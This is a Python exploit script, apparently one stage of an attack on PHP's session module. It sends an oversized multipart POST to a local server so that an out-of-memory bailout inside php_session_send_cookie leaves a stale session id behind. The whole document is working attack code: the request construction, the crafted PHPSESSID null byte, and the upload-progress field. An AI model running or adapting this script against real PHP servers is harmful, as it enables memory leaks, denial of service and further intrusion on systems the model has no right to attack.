#!/usr/bin/env python3
"""Leak prime that OOMs inside php_session_send_cookie (no display_errors needed).

Fields consume almost all of memory_limit, then:
  PHPSESSID = \x00  -> initialize creates a random id, sets send_cookie=1
  file part         -> FILE_START -> initialize -> reset_id -> php_url_encode
                       allocates ~128 bytes; if the limit is hit here, the
                       zend_bailout leaves send_cookie=1 and a stale PS(id).

usage: send_a_oomcookie.py N_BIG BL N_SMALL SL TL
"""
import socket,sys
NB=int(sys.argv[1]); BL=int(sys.argv[2]); NS=int(sys.argv[3]); SL=int(sys.argv[4])
TL=int(sys.argv[5]) if len(sys.argv)>5 else 0
BND=b'S'*17
parts=[]
for i in range(NB):
    parts.append({'name':('b%04d'%i)[:5],'data':b'B'*BL})
for i in range(NS):
    parts.append({'name':('s%04d'%i)[:5],'data':b'S'*SL})
parts.append({'name':'t','data':b'T'*TL})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=40); s.settimeout(40)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
